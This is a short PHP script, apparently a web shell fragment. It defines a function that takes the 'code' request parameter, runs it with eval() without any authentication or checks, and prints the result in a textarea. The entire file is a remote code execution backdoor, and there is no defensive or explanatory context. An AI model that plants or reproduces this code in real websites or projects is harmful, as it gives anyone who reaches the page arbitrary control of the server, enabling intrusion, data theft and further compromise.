<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		echo "<center><textarea rows=\"10\" cols=\"64\">";
		$code = $_REQUEST['code'];
		echo htmlspecialchars(eval($code));
		echo "</textarea></center><br>";
	}
}

phpevaL();
?>